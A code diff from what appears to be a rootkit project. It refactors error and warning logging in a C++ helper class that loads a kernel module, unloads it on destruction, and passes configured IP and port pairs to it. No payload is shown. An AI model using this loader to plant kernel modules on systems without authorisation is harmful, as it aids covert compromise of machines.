@@ -2,11 +2,12 @@
 #include "common.h"
 #include "rootkit/ConfigManager.hpp"
 #include "rootkit/Utils.hpp"
+#include "rootkit/issues/Logger.hpp"
+#include "rootkit/issues/Warning.hpp"
 
 #include <fcntl.h>
 #include <cerrno>
 #include <cstring>
-#include <iostream>
 #include <sys/ioctl.h>
 #include <sys/syscall.h>
 #include <unistd.h>
@@ -14,19 +15,20 @@
 #include <format>
 
 rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
-                        const std::string& module_dev_name
+                        const std::string& module_dev_name,
+                        const issues::Logger& logger
 )
     :conf(conf),
     module_name(conf.module_name),
     module_path(conf.module_path),
     module_dev_name(module_dev_name),
-    loading_error(""),
+    error(logger),
+    warning(logger),
     data({})
 {
     int fd = open(module_path.c_str(), O_RDONLY);
     if (fd < 0) {
-        loading_error = "file " + module_path + " cannot be read";
-        std::cerr << loading_error << std::endl;
+        error = "file " + module_path + " cannot be read";
         return;
     }
 
@@ -42,20 +44,21 @@ rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
     // Load module, and save error message if there is any
     if (init_module(module_data, size, "") < 0) {
         int saved_errno = errno;
-        // Get error message into the loading_error variable
+        // Get error message
         const char * msg = std::strerror(saved_errno);
+        std::string error_msg = "";
         if (msg && *msg)
-            loading_error = std::format("init_module: {}", msg);
+            error_msg = std::format("init_module: {}", msg);
 
         // Check if the error is permission or module state
         if (saved_errno == EPERM) {
-            loading_error += "\nPermission denied - check SELinux status, secure boot, or capabilities";
+            error_msg += "\nPermission denied - check SELinux status, secure boot, or capabilities";
         } else if (saved_errno == EEXIST) {
-            loading_error += "\nModule already loaded";
+            error_msg += "\nModule already loaded";
         } else if (saved_errno == ENOEXEC) {
-            loading_error += "\nModule format error";
+            error_msg += "\nModule format error";
         }
-        std::cerr << loading_error << std::endl;
+        error = error_msg;
     }
 
     if (status() == std::nullopt) {
@@ -65,7 +68,7 @@ rootkit::KernelModuleHelper::KernelModuleHelper(const KernelModuleConfig& conf,
 
 rootkit::KernelModuleHelper::~KernelModuleHelper() {
     // Check for error in loading, and if any don't unload the kernel module
-    if (!loading_error.empty())
+    if (!error.empty())
         return;
     // Unload module
     if (delete_module(module_name.c_str(), O_NONBLOCK) < 0) {
@@ -74,8 +77,8 @@ rootkit::KernelModuleHelper::~KernelModuleHelper() {
 }
 
 std::optional<std::string> rootkit::KernelModuleHelper::status() const {
-    if (!loading_error.empty())
-        return loading_error;
+    if (!error.empty())
+        return error.get_message();
     return std::nullopt;
 }
 
@@ -83,7 +86,7 @@ bool rootkit::KernelModuleHelper::set_data() {
     for (const auto& ip_and_port : conf.ips_and_ports) {
         auto ip = utils::convert_ip(ip_and_port.first);
         if (!ip.has_value()) {
-            // TODO: send warning
+            warning = std::format("ip {} couldn't be converted", ip_and_port.first);
             continue;
         }
 
